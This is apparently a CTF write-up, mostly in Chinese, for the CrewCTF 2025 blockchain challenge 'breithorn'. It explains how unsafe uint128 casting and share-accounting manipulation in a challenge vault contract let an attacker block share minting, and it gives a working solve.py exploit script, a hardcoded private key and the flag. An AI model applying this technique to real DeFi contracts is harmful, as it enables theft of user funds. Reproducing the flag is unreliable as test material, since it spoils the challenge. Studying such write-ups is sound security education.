---
title: Blockchain - breithorn
description: 2025 | CrewCTF | Blockchain
tags:
    - smart contract
    - unsafe casting
---

## 题目

Don't let BOB get any funds, at all cost, btw: https://www.youtube.com/watch?v=ytWz0qVvBZ0

Get an instance via https://breithorn.chal.crewc.tf/ and connect via `ncat --ssl inst-xxxxxxxxxx-breithorn.chal.crewc.tf 1337`, make the function `isSolved` return TRUE to get the flag.

[:material-download: `breithorn.zip`](static/breithorn.zip)

## 解题思路

- 需要在最后调用函数 `isSolved` 时，合约 Challenge 无法通过 deposit 获得任何份额。

    ```js
    function isSolved() public returns(bool) {

        Vault vault = Vault(vaultFactory.vaultAt(0));
        if(address(vault) == address(0)) return false;

        // helper function to simulate the challenge token minting
        Token(address(vault.asset())).mintToChallenge();

        vault.asset().approve(address(vault), type(uint256).max);
        vault.deposit(800 ether, address(this));

        if(vault.balanceOf(address(this)) == 0) return true;

        return false;
    }
    ```

- 第一反应是使用通胀攻击，但是合约 Vault 的 `totalAssets` 和 `totalShares` 使用的是存储的值而不是实时代币余额，所以不能直接转移代币给合约 Vault。不过，在部署时可以设置任意 `uint128` 范围内的初始 `totalShares`。

    ```js
    constructor(ERC20 _asset, uint256[] memory params) ERC20("", "") payable {
        // [...]
        minDepositAmount = params[2] * 10 ** 6;

        _mint(address(this), minDepositAmount);
        totalAsset.shares += uint128(minDepositAmount);
    }
    ```

- 由于在调用 `_deposit()` 更新存储并铸造代币前，会将 `uint256` 类型的 `_amount` 和 `_sharesReceived` 强制转换为 `uint128` 类型，所以可以通过恰当地构造 `total.shares` 和 `total.amount` 的值来让合约 Challenge 调用 `deposit()` 时计算出的 `_sharesReceived` 为 $2^{128}$，从而在强制类型转换时归零。

    ```solidity
    function deposit(uint256 _amount, address _receiver) external returns (uint256 _sharesReceived) {
        Account memory _totalAsset = totalAsset;

        _sharesReceived = _totalAsset.toShares(_amount, false);

        _deposit(_totalAsset, uint128(_amount), uint128(_sharesReceived), _receiver);
    }

    function toShares(Account memory total, uint256 amount, bool roundUp) internal pure returns (uint256 shares) {
        if (total.amount == 0) {
            shares = amount;
        } else {
            shares = (amount * total.shares) / total.amount;
            if (roundUp && (shares * total.amount) / total.shares < amount) {
                shares = shares + 1;
            }
        }
    }
    ```

- 更简单地，可以将初始 `total.shares` 设置为 0，在 `total.amount` 为 0 时，调用 `repayAsset()` 通过支付费用使得 `total.amount` 大于 0，这样无论 Challenge 合约 deposit 多少代币都不会铸造 share 代币。

    ```js
    function _repayAsset(
        // [...]
    ) internal {
        // [...]

        userBorrowShares[_borrower] -= _shares;
        totalBorrow = _totalBorrow;

        uint256 fees = block.number - lastBorrow[_borrower];
        totalAsset.amount += uint128(fees);

        // [...]
    }

    function repayAsset(uint256 _shares, address _borrower) external returns (uint256 _amountToRepay) {
        Account memory _totalBorrow = totalBorrow;
        _amountToRepay = _totalBorrow.toAmount(_shares, true);

        _repayAsset(_totalBorrow, uint128(_amountToRepay), uint128(_shares), msg.sender, _borrower);
    }
    ```

??? note "solve.py"

    ```py
    from cheb3 import Connection
    from cheb3.utils import load_compiled

    factory_abi, _ = load_compiled("VaultFactory.sol")
    vault_abi, _ = load_compiled("Vault.sol")
    token_abi, _ = load_compiled("Token.sol")

    conn = Connection("<rpc-url>")
    account = conn.account("0x0c055dc5791bc7b49b2f85b911906fd80c5d654a9d14f9ad95cbb6fb80fd829c")
    setup = "<challenge-address>"

    factory_addr = conn.cast_call(setup, "vaultFactory()(address)")
    factory = conn.contract(account, address=factory_addr, abi=factory_abi)
    factory.functions.deploy([[1, 1, 0]]).send_transaction()

    vault_addr = factory.caller.vaultAt(0)
    vault = conn.contract(account, address=vault_addr, abi=vault_abi)

    token_addr = vault.caller.asset()
    token = conn.contract(account, address=token_addr, abi=token_abi)
    token.functions.mintToPlayer().send_transaction()

    token.functions.approve(vault_addr, 2**256 - 1).send_transaction()
    vault.functions.repayAsset(2 ** 128, account.address).send_transaction()

    print("Solved:", conn.cast_call(setup, "isSolved()(bool)"))
    ```

### Flag

> crew{C411D474Z3r04NDM1r4D0r}
